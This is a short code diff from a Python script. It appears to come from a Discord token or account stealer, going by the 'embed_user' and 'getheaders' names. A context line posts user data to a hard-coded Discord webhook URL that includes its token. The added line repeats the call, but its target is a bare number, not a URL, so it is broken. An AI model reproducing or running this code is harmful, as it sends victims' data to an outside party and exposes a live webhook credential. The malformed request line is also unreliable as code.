@@ -206,6 +206,7 @@ def main():
                 }
 
                 urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1353328625738317896/qu5pBM_o-aEzwxrZxPnphCZ_wyEU5hGnPAYe9G0zd-kjH3Z9_w24FxZ0Ltexjh4G4Q3Y', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('1235112208841703526', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
